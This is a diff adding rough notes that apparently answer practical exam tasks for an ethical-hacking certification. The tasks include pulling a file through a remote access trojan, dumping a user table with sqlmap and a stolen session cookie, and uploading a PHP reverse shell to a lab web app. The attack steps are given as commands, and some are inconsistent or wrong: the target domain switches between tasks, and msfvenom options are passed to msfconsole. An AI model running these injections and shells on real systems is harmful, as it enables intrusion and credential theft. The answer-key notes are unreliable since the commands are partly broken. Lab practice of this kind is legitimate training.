@@ -1,0 +1,49 @@
+A disgruntled ex-employee has hidden a server access
+code in a Windows machine in the 192.168.0.0/24 subnet. You
+cannot physically access the target machine, but you know
+that the organization has installed a RAT in the machine for
+remote administration purposes. Your task is to retrieve the
+"sa_code.txt" file from the target machine and enter the string
+in the file as the answer. (Format:AA*NNaAa)
+
+
+
+theef rat port - 9871,6703,5552
+
+
+
+Perform an SQL injection attack on your target web
+application cinema.cehorg.com and extract the password of a
+user Sarah. You have already registered on the website with
+credentials Karen/computer. (Format: abc123)
+
+steps -
+login to the website as Karen/computer
+go to inspect element -> console -> document.cookie to get the cookie of authenticated user.
+inject using cookie - 
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" --dbs
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;ur-tabs-1=0" -D moviescope
+-T user-login --dump
+
+
+https://www.scribd.com/document/742644908/5-6087116402542512855-1
+
+Perform vulnerability research and exploit the web
+application training.cehorg.com, available at 192.168.0.64.
+Locate the Flag.txt file and enter its content as the answer.
+(Format: p74NSHXz)
+
+scan the target with zap. look for file upload/file inclusion vulnerability on DVWA
+create php reverse shell.php using msfconsole with lhost=127.0.0.1 lport=4444 -r raw >exploit.php
+upload it, check google how to access the uploaded php file.
+
+Perform SQL injection attack on a web application,
+cybersec.cehorg.com, available at 172.20.0.22. Find the value
+in the Flag column in one of the DB tables and enter it as the
+answer. (Format: ykPje8Qb)
+
+Open the url -
+check in wapalyzer if it is java based. = use JSQL tool in parrot to inject - check for steps in google.
+
+
+
